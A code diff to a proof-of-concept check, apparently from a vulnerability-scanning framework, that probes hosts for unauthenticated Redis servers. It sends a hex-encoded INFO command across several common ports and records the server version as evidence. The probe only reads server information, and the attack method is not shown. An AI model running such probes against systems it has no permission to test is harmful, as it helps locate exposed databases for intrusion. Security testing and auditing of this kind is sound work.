@@ -28,26 +28,28 @@ class TestPOC(POCBase):
     def _verify(self):
         result = {}
         payload = '\x2a\x31\x0d\x0a\x24\x34\x0d\x0a\x69\x6e\x66\x6f\x0d\x0a'
-        s = socket.socket()
-        socket.setdefaulttimeout(4)
-        try:
-            host = self.url.split(':')[1].strip('/')
-            if len(self.url.split(':')) > 2:
-                port = int(self.url.split(':')[2].strip('/'))
-            else:
-                port = 6379
-            s.connect((host, port))
-            s.send(payload)
-            data = s.recv(1024)
-            if data and 'redis_version' in data:
-                result['VerifyInfo'] = {}
-                result['VerifyInfo']['url'] = self.url
-                result['VerifyInfo']['port'] = port
-                result['VerifyInfo']['result'] = data#[:20]
-        except Exception as e:
-            #print e
-            pass
-        s.close()
+        pr = urlparse.urlparse(self.url)
+        if pr.port:  # and pr.port not in ports:
+            ports = [pr.port]
+        else:
+            ports = [6379,16379,26379]
+        for port in ports:
+            try:
+                s = socket.socket()
+                s.connect((pr.hostname, port))
+                s.send(payload)
+                data = s.recv(4096)
+                if data and 'redis_version' in data:
+                    result['VerifyInfo'] = {}
+                    result['VerifyInfo']['URL'] = '{}:{}'.format(pr.hostname,port)
+                    result['extra'] = {}
+                    result['extra']['evidence'] = data
+                    break
+            except:
+                pass
+            finally:
+                s.close()
+
         return self.parse_attack(result)
 
     def _attack(self):
